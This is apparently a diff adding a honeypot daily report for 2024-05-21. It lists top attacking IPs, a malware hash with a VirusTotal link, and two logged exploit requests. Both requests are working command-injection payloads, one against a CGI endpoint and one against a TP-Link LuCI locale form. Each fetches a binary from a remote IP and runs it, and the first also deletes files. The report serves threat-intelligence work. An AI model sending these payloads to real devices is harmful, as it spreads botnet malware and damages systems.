@@ -1,0 +1,24 @@
+Top 5 IPs for 2024-05-21 :
+
+58.106.144.6
+218.92.0.96
+180.107.207.183
+112.249.56.162
+39.90.147.149
+
+
+Malware Observed:
+
+File name: xinetd
+b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+https://www.virustotal.com/gui/file/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+
+
+Commands/exploits observed:
+
+GET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://59.89.70.2:36481/Mozi.m;${IFS}sh${IFS}/var/tmp/Mozi.m HTTP/1.0
+
+
+
+http://<HOST-NAME>/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F185.142.238.35%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)
+
